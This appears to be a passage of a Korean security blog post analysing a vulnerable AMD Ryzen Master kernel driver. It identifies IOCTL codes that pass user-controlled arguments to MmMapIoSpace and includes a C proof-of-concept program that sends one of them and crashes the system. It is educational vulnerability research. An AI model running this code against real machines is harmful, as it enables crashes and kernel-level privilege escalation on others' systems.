&#xB4DC;&#xB77C;&#xC774;&#xBC84;&#xB294; &#xC704; &#xACBD;&#xB85C;&#xC5D0;&#xC11C; &#xCC3E;&#xC744; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><h1 id="Kernel-Driver-Driver-Exploit"><a href="#Kernel-Driver-Driver-Exploit" class="headerlink" title="Kernel Driver / Driver Exploit"></a>Kernel Driver / Driver Exploit</h1><p>&#xBCF8;&#xACA9;&#xC801;&#xC73C;&#xB85C; &#xBD84;&#xC11D;&#xC744; &#xD558;&#xAE30; &#xC804;&#xC5D0; &#xB4DC;&#xB77C;&#xC774;&#xBC84;&#xAC00; &#xC5B4;&#xB5A4; &#xAC83;&#xC778;&#xC9C0;, &#xCDE8;&#xC57D;&#xC810;&#xC5D0;&#xB294; &#xC5B4;&#xB5A4; &#xAC83;&#xC774; &#xC788;&#xB294;&#xC9C0;&#xBD80;&#xD130; &#xC54C;&#xC544;&#xBD10;&#xC57C; &#xD569;&#xB2C8;&#xB2E4;.</p><p>Windows Kernel&#xC740; &#xBAA8;&#xB4C8;&#xD654;&#xAC00; &#xB418;&#xC5B4; &#xC788;&#xC73C;&#xBA70; Core Kernel(Microkernel)&#xACFC; Device Driver &#xB450; &#xAC00;&#xC9C0;&#xB85C; &#xB098;&#xB20C; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. Core &#xBAA8;&#xB4C8;&#xC5D0;&#xB294; Kernel&#xC758; &#xD575;&#xC2EC;&#xC801;&#xC778; &#xAE30;&#xB2A5;&#xC774; &#xAD6C;&#xD604;&#xB418;&#xC5B4; &#xC788;&#xACE0; &#xB300;&#xBD80;&#xBD84;&#xC758; &#xCEE4;&#xB110; &#xAE30;&#xB2A5;&#xC740; driver &#xD615;&#xD0DC;&#xB85C; &#xBAA8;&#xB4C8;&#xD654; &#xB418;&#xC5B4; &#xAD6C;&#xD604;&#xB429;&#xB2C8;&#xB2E4;. &#xC774;&#xB7EC;&#xD55C; &#xBAA8;&#xB4C8;&#xD654;&#xC758; &#xC7A5;&#xC810;&#xC740; &#xD655;&#xC7A5;&#xC131;&#xACFC; &#xC720;&#xC9C0;&#xBCF4;&#xC218;&#xAC00; &#xC6A9;&#xC774;&#xD558;&#xB2E4;&#xB294; &#xC810;&#xC774; &#xC788;&#xACA0;&#xB124;&#xC694;!</p><p><img src="/2021/07/14/l0ch/windows-driver-part2/Untitled%204.png" alt="windows-driver-part2/Untitled%204.png"></p><blockquote><p>Windows NT &#xACC4;&#xC5F4;&#xC758; &#xCEE4;&#xB110; &#xC544;&#xD0A4;&#xD14D;&#xCC98;</p></blockquote><p>Windows&#xC5D0;&#xC11C; &#xB4DC;&#xB77C;&#xC774;&#xBC84;&#xB294; &#xD2B9;&#xC815; &#xC774;&#xBCA4;&#xD2B8;&#xAC00; &#xBC1C;&#xC0DD;&#xD560; &#xB54C; &#xCEE4;&#xB110; &#xCEE8;&#xD14D;&#xC2A4;&#xD2B8;&#xC5D0;&#xC11C; &#xC2E4;&#xD589;&#xB418;&#xB294; &#xCF54;&#xB4DC;&#xB97C; &#xD3EC;&#xD568;&#xD558;&#xB294; &#xBAA8;&#xB4C8;&#xB85C; &#xC815;&#xC758;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC815;&#xB9AC;&#xD558;&#xBA74; &#xCEE4;&#xB110; &#xAD8C;&#xD55C;&#xC774; &#xD544;&#xC694;&#xD55C; &#xC791;&#xC5C5;&#xC774; &#xD544;&#xC694;&#xD560; &#xB54C; &#xC2E4;&#xD589;&#xB418;&#xB294; &#xCF54;&#xB4DC;&#xB97C; &#xBAA8;&#xB4C8;&#xD654; &#xD55C; &#xAC83;&#xC785;&#xB2C8;&#xB2E4;.  </p><p>&#xC704; &#xC0AC;&#xC9C4;&#xC5D0;&#xC11C; &#xBCFC; &#xC218; &#xC788;&#xB4EF;&#xC774; Windows&#xB294; User mode&#xC640; Kernel mode&#xB85C; &#xAD8C;&#xD55C;&#xC774; &#xB098;&#xB258;&#xC5B4; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. User mode&#xC5D0;&#xC11C; &#xC2E4;&#xD589;&#xB418;&#xB294; &#xC5B4;&#xD50C;&#xB9AC;&#xCF00;&#xC774;&#xC158;&#xC774; &#xCEE4;&#xB110; &#xAD8C;&#xD55C;&#xC774; &#xD544;&#xC694;&#xD55C; &#xC791;&#xC5C5;&#xC744; &#xC694;&#xAD6C;&#xD560; &#xB54C; &#xCEE4;&#xB110; &#xAD8C;&#xD55C;&#xC5D0; &#xC9C1;&#xC811;&#xC801;&#xC73C;&#xB85C; &#xC811;&#xADFC;&#xD558;&#xB294; &#xAC83;&#xC774; &#xC544;&#xB2CC; &#xCEE4;&#xB110; &#xAD8C;&#xD55C;&#xC73C;&#xB85C; &#xC2E4;&#xD589;&#xB418;&#xB294; &#xB4DC;&#xB77C;&#xC774;&#xBC84;&#xC5D0;&#xAC8C; &#xC694;&#xCCAD;&#xC744; &#xBCF4;&#xB0B4; &#xAC04;&#xC811;&#xC801;&#xC73C;&#xB85C; &#xC218;&#xD589;&#xD558;&#xB294; &#xAC83;&#xC774;&#xC8E0;. &#xC774;&#xB54C; User mode &#xC5B4;&#xD50C;&#xB9AC;&#xCF00;&#xC774;&#xC158;&#xC740; I/O Manager&#xB97C; &#xD1B5;&#xD574; &#xB4DC;&#xB77C;&#xC774;&#xBC84;&#xC5D0;&#xAC8C; &#xC694;&#xCCAD;&#xC744; &#xBCF4;&#xB0B4;&#xB294;&#xB370;, IOCTL(I/O Control) &#xCF54;&#xB4DC;&#xB85C; &#xB4DC;&#xB77C;&#xC774;&#xBC84;&#xAC00; &#xC5B4;&#xB5A4; &#xAE30;&#xB2A5;&#xC744; &#xC218;&#xD589;&#xD560;&#xC9C0;&#xB97C; &#xACB0;&#xC815;&#xD569;&#xB2C8;&#xB2E4;.</p><p>&#xADF8;&#xB807;&#xB2E4;&#xBA74;, &#xC774;&#xB7F0; &#xB4DC;&#xB77C;&#xC774;&#xBC84;&#xC5D0;&#xC11C; &#xCC3E;&#xC744; &#xC218; &#xC788;&#xB294; &#xCDE8;&#xC57D;&#xC810;&#xC740; &#xC5B4;&#xB5A4; &#xAC83;&#xC774; &#xC788;&#xC744;&#xC9C0; &#xAC10;&#xC774; &#xC624;&#xC9C0; &#xC54A;&#xB098;&#xC694;?</p><p>&#xB4DC;&#xB77C;&#xC774;&#xBC84;&#xC758; &#xCDE8;&#xC57D;&#xC810; &#xACF5;&#xACA9;&#xC5D0; &#xC131;&#xACF5;&#xD558;&#xBA74; &#xC720;&#xC800; &#xAD8C;&#xD55C;&#xC758; &#xC5B4;&#xD50C;&#xB9AC;&#xCF00;&#xC774;&#xC158;&#xC73C;&#xB85C;&#xB294; &#xD560; &#xC218; &#xC5C6;&#xB294; &#xB192;&#xC740; &#xAD8C;&#xD55C;&#xC5D0;&#xC11C;&#xC758; &#xC784;&#xC758; &#xBA85;&#xB839;&#xC5B4; &#xC2E4;&#xD589;&#xC774; &#xAC00;&#xB2A5;&#xD558;&#xACE0; &#xD0C0;&#xAC9F;&#xC5D0;&#xAC8C; &#xB354; &#xD070; &#xD53C;&#xD574;&#xB97C; &#xB07C;&#xCE60; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC774;&#xB97C; &#xAD8C;&#xD55C; &#xC0C1;&#xC2B9; &#xCDE8;&#xC57D;&#xC810;(Privilege Escalation)&#xC774;&#xB77C;&#xACE0; &#xBD80;&#xB985;&#xB2C8;&#xB2E4;.</p><p>&#xADF8;&#xB7F0;&#xB370; Microsoft&#xAC00; &#xBC14;&#xBCF4;&#xB3C4; &#xC544;&#xB2C8;&#xACE0; &#xCEE4;&#xB110; &#xAD8C;&#xD55C;&#xC73C;&#xB85C; &#xB3CC;&#xC544;&#xAC00;&#xB294; &#xB4DC;&#xB77C;&#xC774;&#xBC84;&#xB294; &#xC880; &#xB354; &#xBCF4;&#xC548;&#xC5D0; &#xC2E0;&#xACBD;&#xC744; &#xC368;&#xC11C; &#xAC1C;&#xBC1C;&#xD588;&#xC744; &#xAC70; &#xAC19;&#xC9C0; &#xC54A;&#xB098;&#xC694;? &#xBB38;&#xC81C;&#xB294; &#xC774; &#xB4DC;&#xB77C;&#xC774;&#xBC84;&#xB294; MS&#xAC00; &#xC544;&#xB2CC; &#xC81C;&#xC0BC;&#xC790;(third-party)&#xB3C4; &#xAC1C;&#xBC1C;&#xD558;&#xACE0; &#xBC30;&#xD3EC;&#xD560; &#xC218; &#xC788;&#xC5B4; &#xBC1C;&#xC0DD;&#xD569;&#xB2C8;&#xB2E4;. </p><p>third-party driver&#xB294; &#xBCF4;&#xD1B5; &#xCEE4;&#xB110; &#xB808;&#xBCA8;&#xC758; &#xB192;&#xC740; &#xAD8C;&#xD55C;&#xC744; &#xC694;&#xAD6C;&#xD558;&#xB294; &#xBC31;&#xC2E0;&#xC774;&#xB098; &#xD558;&#xB4DC;&#xC6E8;&#xC5B4;&#xB97C; &#xC9C1;&#xC811; &#xC81C;&#xC5B4;&#xD558;&#xB294; &#xB9C8;&#xC6B0;&#xC2A4;, &#xBAA8;&#xB2C8;&#xD130; &#xB4DC;&#xB77C;&#xC774;&#xBC84;, &#xD558;&#xB4DC;&#xC6E8;&#xC5B4; &#xBAA8;&#xB2C8;&#xD130;&#xB9C1; &#xB4F1;&#xC758; &#xC81C;&#xC870;&#xC0AC; &#xC720;&#xD2F8;&#xB9AC;&#xD2F0;&#xC5D0;&#xC11C; &#xB9CE;&#xC774; &#xC0AC;&#xC6A9;&#xD569;&#xB2C8;&#xB2E4;. Microsoft&#xAC00; Windows &#xCEE4;&#xB110;&#xACFC; &#xC790;&#xAE30;&#xB124; &#xB4DC;&#xB77C;&#xC774;&#xBC84;&#xB97C; &#xC544;&#xBB34;&#xB9AC; &#xC2EC;&#xD608;&#xC744; &#xAE30;&#xC6B8;&#xC5EC; &#xBC84;&#xADF8; &#xC5C6;&#xC774; &#xB0B4;&#xB193;&#xB294;&#xB2E4;&#xACE0; &#xD574;&#xB3C4; &#xC774;&#xB7F0; third-party driver&#xB4E4;&#xC774; &#xC788;&#xB294; &#xD55C; &#xAD8C;&#xD55C; &#xC0C1;&#xC2B9; &#xCDE8;&#xC57D;&#xC810;&#xC740; &#xD321;&#xD321; &#xD130;&#xC9C8; &#xAC83; &#xAC19;&#xB124;&#xC694;!</p><p><img src="/2021/07/14/l0ch/windows-driver-part2/Untitled%205.png" alt="windows-driver-part2/Untitled%205.png"></p><blockquote><p>&#xC694;&#xC998; &#xD56B;&#xD55C; PrintNightmare&#xAC19;&#xC740; &#xD504;&#xB9B0;&#xD130; &#xC2A4;&#xD480;&#xB7EC; &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xD130;&#xC9C0;&#xB294; &#xAC70; &#xBCF4;&#xBA74; &#xB9C8;&#xC18C;&#xB3C4; &#xBB50;.. &#xAC08; &#xAE38;&#xC774; &#xBA3C; &#xAC83; &#xAC19;&#xC9C0;&#xB9CC;&#xC694; &#x314E;&#x314E;;;</p></blockquote><p>&#xC624;&#xB298; &#xAE00;&#xC744; &#xBCF4;&#xAE30; &#xC804; &#xB4DC;&#xB77C;&#xC774;&#xBC84; &#xC775;&#xC2A4;&#xD50C;&#xB85C;&#xC787;&#xC5D0; &#xB300;&#xD55C; &#xC544;&#xB798; &#xBC88;&#xC5ED;&#xAE00;&#xC744; &#xC77D;&#xC5B4;&#xBCF4;&#xBA74; &#xB3C4;&#xC6C0;&#xC774; &#xB429;&#xB2C8;&#xB2E4;!</p><p><a href="https://hackyboiz.github.io/2021/04/21/l0ch/exploiting-driver/">[Translation] Exploiting System Mechanic Driver Part 1</a></p><p><a href="https://hackyboiz.github.io/2021/04/28/l0ch/exploiting-driver-part2/">[Translation] Exploiting System Mechanic Driver Part 2</a></p><h1 id="Vulnerability-Analysis"><a href="#Vulnerability-Analysis" class="headerlink" title="Vulnerability Analysis"></a>Vulnerability Analysis</h1><h2 id="Overview"><a href="#Overview" class="headerlink" title="Overview"></a>Overview</h2><p>&#xC774;&#xC81C; &#xBCF8;&#xACA9;&#xC801;&#xC73C;&#xB85C; &#xCDE8;&#xC57D;&#xC810;&#xC744; &#xBD84;&#xC11D;&#xD574;&#xBCFC; &#xCC28;&#xB840;&#xC785;&#xB2C8;&#xB2E4;! &#xBA3C;&#xC800; &#xB4DC;&#xB77C;&#xC774;&#xBC84; &#xC11C;&#xBE44;&#xC2A4;&#xAC00; &#xB3D9;&#xC791;&#xC911;&#xC778;&#xC9C0; &#xD655;&#xC778;&#xBD80;&#xD130; &#xD574;&#xBCF4;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><img src="/2021/07/14/l0ch/windows-driver-part2/2.png" alt="windows-driver-part2/2.png"></p><p>WinObj&#xB85C; &#xD655;&#xC778;&#xD574;&#xBCF4;&#xBA74; AMDRyzenMasterDriverV15 &#xB514;&#xBC14;&#xC774;&#xC2A4;&#xAC00; &#xC62C;&#xB77C;&#xC628; &#xAC83;&#xC744; &#xBCFC; &#xC218; &#xC788;&#xB124;&#xC694;. </p><p><code>AMDRyzenMasterDriverV15.sys</code> &#xB97C; IDA&#xB85C; &#xC5F4;&#xC790;&#xB9C8;&#xC790; &#xBC14;&#xB85C; <code>DriverEntry</code> &#xBD80;&#xD130; &#xCC3E;&#xC544;&#xBCF4;&#xC8E0;</p><p><img src="/2021/07/14/l0ch/windows-driver-part2/Untitled%206.png" alt="windows-driver-part2/Untitled%206.png"></p><p><code>sub_140008A5C</code>&#xB85C; &#xAC00;&#xBCFC;&#xAE4C;&#xC694;?</p><p><img src="/2021/07/14/l0ch/windows-driver-part2/tempsnip%201.png" alt="windows-driver-part2/tempsnip%201.png"></p><p><code>DriverEntry</code>&#xC5D0;&#xC11C; &#xCCAB; &#xBC88;&#xC9F8; &#xB9E4;&#xAC1C;&#xBCC0;&#xC218;&#xB85C; <code>PDRIVER_OBJECT</code> &#xB97C; &#xC92C;&#xC73C;&#xB2C8; &#xB9E4;&#xAC1C;&#xBCC0;&#xC218; <code>a1</code>&#xC758; type&#xC744; <code>PDRIVER_OBJECT</code>&#xB85C; &#xBCC0;&#xD658;&#xD569;&#xB2C8;&#xB2E4;. &#xC5EC;&#xAE30;&#xC120; dispatch routine&#xC744; &#xCC3E;&#xC744; &#xC218; &#xC5C6;&#xB124;&#xC694;.  <code>PDRIVER_OBJECT</code>&#xB97C; &#xB9E4;&#xAC1C;&#xBCC0;&#xC218;&#xB85C; &#xC804;&#xB2EC;&#xD558;&#xB294; &#xD568;&#xC218;&#xB97C; &#xB354; &#xCC3E;&#xC544;&#xBCF4;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;. <code>sub_1400046AC</code>&#xB97C; &#xBCFC;&#xAE4C;&#xC694;? </p><p><img src="/2021/07/14/l0ch/windows-driver-part2/tempsnip2.png" alt="windows-driver-part2/tempsnip2.png"></p><p>&#xC774;&#xBC88;&#xC5D0;&#xB294; <code>DRIVER_OBJECT-&gt;MajorFunction[14]</code>&#xC5D0; dispatch routine&#xC744; &#xD560;&#xB2F9;&#xD558;&#xB294; &#xCF54;&#xB4DC;&#xB97C; &#xCC3E;&#xC744; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;! &#xC7A5;&#xCE58;&#xBA85;&#xB3C4; &#xBCF4;&#xC774;&#xB124;&#xC694;. </p><p><img src="/2021/07/14/l0ch/windows-driver-part2/Untitled%207.png" alt="windows-driver-part2/Untitled%207.png"></p><p>dispatch routine&#xC5D0;&#xB294; IOCTL &#xCF54;&#xB4DC;&#xC640; &#xCF54;&#xB4DC; &#xBCC4; &#xB8E8;&#xD2F4;&#xC744; &#xBCFC; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><h2 id="MmMapIoSpace"><a href="#MmMapIoSpace" class="headerlink" title="MmMapIoSpace"></a>MmMapIoSpace</h2><p>&#xC774;&#xC81C; &#xD568;&#xC218; &#xD558;&#xB098;&#xB97C; &#xC911;&#xC810;&#xC801;&#xC73C;&#xB85C; &#xBCF4;&#xBA74;&#xC11C; &#xCDE8;&#xC57D;&#xC810;&#xC744; &#xCC3E;&#xC544;&#xBCFC; &#xD150;&#xB370;&#xC694;, &#xD0C0;&#xAC9F;&#xC740; <code>MmMapIoSpace</code>&#xB85C; &#xC815;&#xD558;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;! <code>MmMapIoSpace</code>&#xB294; &#xBB3C;&#xB9AC; &#xC8FC;&#xC18C;&#xB97C; &#xAC00;&#xC0C1; &#xD398;&#xC774;&#xC9C0; &#xC8FC;&#xC18C;&#xC5D0; &#xB9E4;&#xD551;&#xD558;&#xB294; &#xD568;&#xC218;&#xB85C;, &#xD568;&#xC218; &#xC6D0;&#xD615;&#xC740; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs c"><span class="hljs-function">PVOID <span class="hljs-title">MmMapIoSpace</span><span class="hljs-params">(</span></span><span class="hljs-function"><span class="hljs-params">  PHYSICAL_ADDRESS    PhysicalAddress,  <span class="hljs-comment">// &#xB9E4;&#xD551;&#xD560; &#xBB3C;&#xB9AC;&#xC801; &#xC8FC;&#xC18C;</span></span></span><span class="hljs-function"><span class="hljs-params">  SIZE_T              NumberOfBytes,   <span class="hljs-comment">//&#xB9E4;&#xD551;&#xD560; &#xBC14;&#xC774;&#xD2B8; &#xC218;</span></span></span><span class="hljs-function"><span class="hljs-params">  MEMORY_CACHING_TYPE CacheType       <span class="hljs-comment">//&#xB9E4;&#xD551;&#xD558;&#xB294; &#xB370; &#xC0AC;&#xC6A9;&#xD560; &#xCE90;&#xC2DC; &#xC18D;&#xC131;&#xC744; &#xB098;&#xD0C0;&#xB0B4;&#xB294; MEMORY_CACHING_TYPE &#xAC12;</span></span></span><span class="hljs-function"><span class="hljs-params">)</span></span>;</code></pre><p>&#xC660;&#xC9C0; &#xC774; &#xD568;&#xC218; &#xB9E4;&#xAC1C;&#xBCC0;&#xC218;&#xB97C; &#xC81C;&#xC5B4;&#xD560; &#xC218; &#xC788;&#xC73C;&#xBA74; &#xC544;&#xC8FC; &#xC88B;&#xC740; &#xACF5;&#xACA9; &#xBCA1;&#xD130;&#xAC00; &#xB420; &#xAC83; &#xAC19;&#xC8E0;? </p><p><code>MmMapIoSpace</code> &#xAD00;&#xB828; &#xCDE8;&#xC57D;&#xC810;&#xC740; MSI Dragon Center &#xAD8C;&#xD55C;&#xC0C1;&#xC2B9;&#xC744; &#xB2E4;&#xB8E8;&#xB294; &#xD558;&#xB8E8;&#xD55C;&#xC904;(<a href="https://hackyboiz.github.io/2021/06/22/l0ch/2021-06-22/">CVE-2021-29337: MSI Dragon Center&#xC758; &#xB85C;&#xCEEC; &#xAD8C;&#xD55C; &#xC0C1;&#xC2B9; &#xCDE8;&#xC57D;&#xC810;</a>) &#xC5D0;&#xC11C;&#xB3C4; &#xC5B8;&#xAE09;&#xB41C; &#xC801;&#xC774; &#xC788;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;. </p><p><img src="/2021/07/14/l0ch/windows-driver-part2/Untitled%208.png" alt="windows-driver-part2/Untitled%208.png"></p><blockquote><p>&#xC774;&#xB54C; &#xC624;&#xB298; &#xAE00; &#xC608;&#xACE0;&#xB97C; &#xD558;&#xAE30;&#xB3C4; &#xD588;&#xC5C8;&#xC8E0; &#x314E;&#x314E;</p></blockquote><p><img src="/2021/07/14/l0ch/windows-driver-part2/33.png" alt="windows-driver-part2/33.png"></p><p>cross reference view&#xB85C; &#xBCF8; <code>MmMapIoSpace</code>&#xB97C; &#xD638;&#xCD9C;&#xD558;&#xB294; &#xD568;&#xC218; &#xB9AC;&#xC2A4;&#xD2B8;&#xC785;&#xB2C8;&#xB2E4;. <code>sub_140007278</code> &#xD568;&#xC218;&#xB97C; &#xBCF4;&#xB3C4;&#xB85D; &#xD560;&#xAC8C;&#xC694;.</p><p><img src="/2021/07/14/l0ch/windows-driver-part2/Untitled%209.png" alt="windows-driver-part2/Untitled%209.png"></p><p>&#xCF54;&#xB4DC;&#xB97C; &#xBCF4;&#xACE0; &#xBD84;&#xC11D;&#xD574;&#xBCF4;&#xBA74; &#xAC04;&#xB2E8;&#xD558;&#xAC8C; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC774; &#xC815;&#xB9AC;&#xAC00; &#xAC00;&#xB2A5;&#xD569;&#xB2C8;&#xB2E4;.</p><ul><li><code>MmMapIoSpace</code> &#xD568;&#xC218;&#xC5D0; &#xB9E4;&#xAC1C;&#xBCC0;&#xC218; <code>a1</code>&#xC640; <code>a2</code>&#xB97C; &#xAC01;&#xAC01; &#xB9E4;&#xD551;&#xD558;&#xAE38; &#xC6D0;&#xD558;&#xB294; &#xBB3C;&#xB9AC; &#xC8FC;&#xC18C;&#xC640; &#xAE38;&#xC774;&#xB97C; &#xC804;&#xB2EC;&#xD569;&#xB2C8;&#xB2E4;.</li><li><code>BaseAddress</code>&#xC5D0;&#xB294; <code>MmMapIoSpace</code>&#xC758; &#xBC18;&#xD658; &#xAC12;&#xC778; &#xBB3C;&#xB9AC; &#xC8FC;&#xC18C;&#xAC00; &#xB9E4;&#xD551;&#xB41C; &#xAC00;&#xC0C1; &#xD398;&#xC774;&#xC9C0; &#xC8FC;&#xC18C;&#xAC00; &#xB4E4;&#xC5B4;&#xAC11;&#xB2C8;&#xB2E4;.</li><li><code>BaseAddress</code>&#xAC00; NULL&#xC778;&#xC9C0; &#xD655;&#xC778;&#xD558;&#xACE0; &#xC544;&#xB2C8;&#xBA74; <code>NumberOfBytes</code>&#xB9CC;&#xD07C; <code>a3</code> &#xBC84;&#xD37C;&#xC758; &#xAC12;&#xC744; &#xBCF5;&#xC0AC;&#xD569;&#xB2C8;&#xB2E4;.</li><li>&#xBCF5;&#xC0AC;&#xAC00; &#xC644;&#xB8CC;&#xB418;&#xBA74; &#xB9E4;&#xD551;&#xB41C; &#xC8FC;&#xC18C;&#xB97C; &#xB9E4;&#xD551; &#xD574;&#xC81C;&#xD558;&#xACE0; &#xC815;&#xC0C1;&#xC801;&#xC73C;&#xB85C; &#xC885;&#xB8CC;&#xB429;&#xB2C8;&#xB2E4;.</li></ul><p>&#xD574;&#xB2F9; &#xD568;&#xC218;&#xB294; &#xCEE4;&#xB110; &#xBA54;&#xBAA8;&#xB9AC;&#xC5D0; &#xBC14;&#xC774;&#xD2B8; &#xB2E8;&#xC704;&#xB85C; &#xBB34;&#xC5B8;&#xAC00;&#xB97C; &#xC4F0;&#xB294; &#xB8E8;&#xD2F4;&#xC73C;&#xB85C; &#xBCF4;&#xC785;&#xB2C8;&#xB2E4;. &#xD568;&#xC218;&#xB97C; &#xD638;&#xCD9C;&#xD558;&#xB294; dispatch routine&#xC73C;&#xB85C; &#xC62C;&#xB77C;&#xAC00; &#xBCFC;&#xAC8C;&#xC694;.</p><p><img src="/2021/07/14/l0ch/windows-driver-part2/Untitled%2010.png" alt="windows-driver-part2/Untitled%2010.png"></p><p>IOCTL &#xCF54;&#xB4DC;&#xAC00; <code>0x81112F0C</code>&#xC77C;&#xB54C; &#xD568;&#xC218;&#xB97C; &#xD638;&#xCD9C;&#xD558;&#xB124;&#xC694;. </p><p><code>MmMapIoSpace</code>&#xB97C; &#xD638;&#xCD9C;&#xD558;&#xB294; &#xB2E4;&#xB978; &#xD568;&#xC218;&#xC778; <code>sub_1400063D0</code>&#xC744; &#xBCF4;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;.  </p><p><img src="/2021/07/14/l0ch/windows-driver-part2/Untitled%2011.png" alt="windows-driver-part2/Untitled%2011.png"></p><p>&#xC704; &#xD568;&#xC218;&#xB294; &#xBE44;&#xC2B7;&#xD574; &#xBCF4;&#xC774;&#xAE34; &#xD558;&#xC9C0;&#xB9CC; &#xD55C; &#xAC00;&#xC9C0;&#xAC00; &#xB2E4;&#xB974;&#xB124;&#xC694;?  <code>sub_140007278</code> &#xD568;&#xC218;&#xC640; &#xBC18;&#xB300;&#xB85C; &#xCEE4;&#xB110; &#xBA54;&#xBAA8;&#xB9AC;&#xB97C; &#xBC14;&#xC774;&#xD2B8; &#xB2E8;&#xC704;&#xB85C; &#xC4F0;&#xB294; &#xB8E8;&#xD2F4;&#xC778; &#xAC83; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><img src="/2021/07/14/l0ch/windows-driver-part2/Untitled%2012.png" alt="windows-driver-part2/Untitled%2012.png"></p><p>IOCTL <code>0x81112F08</code>&#xC77C; &#xB54C; &#xD574;&#xB2F9; &#xD568;&#xC218; &#xB8E8;&#xD2F4;&#xC744; &#xC218;&#xD589;&#xD569;&#xB2C8;&#xB2E4;.</p><p>&#xC704; &#xB450; &#xD568;&#xC218;&#xC758; <code>MmMapIoSpace</code> &#xB85C; &#xC804;&#xB2EC;&#xB418;&#xB294; &#xB9E4;&#xAC1C;&#xBCC0;&#xC218;&#xC640; &#xBCF5;&#xC0AC;&#xD560; &#xBA54;&#xBAA8;&#xB9AC; &#xC8FC;&#xC18C;&#xB97C; &#xC81C;&#xC5B4;&#xD560; &#xC218; &#xC788;&#xC73C;&#xBA74; &#xC784;&#xC758; &#xC4F0;&#xAE30; &#xBC0F; &#xC784;&#xC758; &#xC77D;&#xAE30;&#xAC00; &#xAC00;&#xB2A5;&#xD560; &#xAC83; &#xAC19;&#xB2E4;&#xB294; &#xB290;&#xB08C;&#xC801;&#xC778; &#xB290;&#xB08C;&#xC774; &#xC624;&#xC9C0; &#xC54A;&#xB098;&#xC694;?! &#xBC14;&#xB85C; &#xD14C;&#xC2A4;&#xD2B8;&#xB97C; &#xD574;&#xBCFC;&#xAC8C;&#xC694;.</p><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;Windows.h&gt;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span><span class="hljs-function"></span>{    HANDLE dHandle;    WCHAR DeviceLink[] = <span class="hljs-string">L&quot;\\\\.\\AMDRyzenMasterDriverV15&quot;</span>;    DWORD dwRet = <span class="hljs-number">0</span>;    LPVOID output_buff = VirtualAlloc(<span class="hljs-literal">NULL</span>,        <span class="hljs-number">0x100c</span>,        MEM_COMMIT | MEM_RESERVE,        PAGE_EXECUTE_READWRITE);    dHandle = CreateFileW(        DeviceLink,        GENERIC_READ | GENERIC_WRITE,        <span class="hljs-number">0</span>,        <span class="hljs-literal">NULL</span>,        OPEN_EXISTING,        FILE_ATTRIBUTE_NORMAL,        <span class="hljs-literal">NULL</span>    );    <span class="hljs-keyword">if</span> (dHandle == INVALID_HANDLE_VALUE)    {        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Get Device Handle Fail! : 0x%X \n&quot;</span>, GetLastError());        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;    }        BYTE input_buff[<span class="hljs-number">0x100</span>] = { <span class="hljs-number">0</span>, };    <span class="hljs-keyword">if</span> (!DeviceIoControl(dHandle, <span class="hljs-number">0x81112F0C</span>, input_buff, <span class="hljs-number">0x40</span>, output_buff, <span class="hljs-number">0x100c</span>, &amp;dwRet, <span class="hljs-number">0</span>))    {        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;DeviceIOControl Fail : 0x%X \n&quot;</span>, GetLastError());        CloseHandle(dHandle);        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;    }    CloseHandle(dHandle);    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;}</code></pre><p>&#xC704; &#xCF54;&#xB4DC;&#xC5D0; &#xB300;&#xD574;&#xC11C;&#xB294; &#xB2E4;&#xC74C; &#xD30C;&#xD2B8;&#xC5D0;&#xC11C; &#xC790;&#xC138;&#xD558;&#xAC8C; &#xC124;&#xBA85;&#xD558;&#xAE30;&#xB85C; &#xD558;&#xACE0;, &#xC9C0;&#xAE08;&#xC740; <a href="https://docs.microsoft.com/en-us/windows/win32/api/ioapiset/nf-ioapiset-deviceiocontrol">DeviceIoControl</a> &#xB97C; &#xD638;&#xCD9C;&#xD558;&#xB294; &#xBD80;&#xBD84;&#xB9CC; &#xBCF4;&#xBA74; &#xB429;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs c">DeviceIoControl(dHandle, <span class="hljs-number">0x81112F0C</span>, input_buff, <span class="hljs-number">0x40</span>, output_buff, <span class="hljs-number">0x100c</span>, &amp;dwRet, <span class="hljs-number">0</span>)</code></pre><p>IOCTL code <code>0x81112F0C</code> &#xB85C; &#xC694;&#xCCAD;&#xC744; &#xBCF4;&#xB0B4;&#xB294;&#xB370; input buffer&#xC640; output buffer&#xB97C; &#xC0AC;&#xC774;&#xC988;&#xC640; &#xD568;&#xAED8; &#xC804;&#xB2EC;&#xD569;&#xB2C8;&#xB2E4;. &#xC5EC;&#xAE30;&#xC11C;&#xB294; input buffer &#xB0B4;&#xC6A9;&#xC744; &#xBAA8;&#xB450; NULL&#xB85C; &#xCC44;&#xC6CC;&#xC11C; &#xC804;&#xB2EC;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;.  </p><p><img src="/2021/07/14/l0ch/windows-driver-part2/BSOD.png" alt="windows-driver-part2/BSOD.png"></p><blockquote><p>&#xBE14;&#xB8E8;&#xC2A4;&#xD06C;&#xB9B0; &#xAC9F;!  : 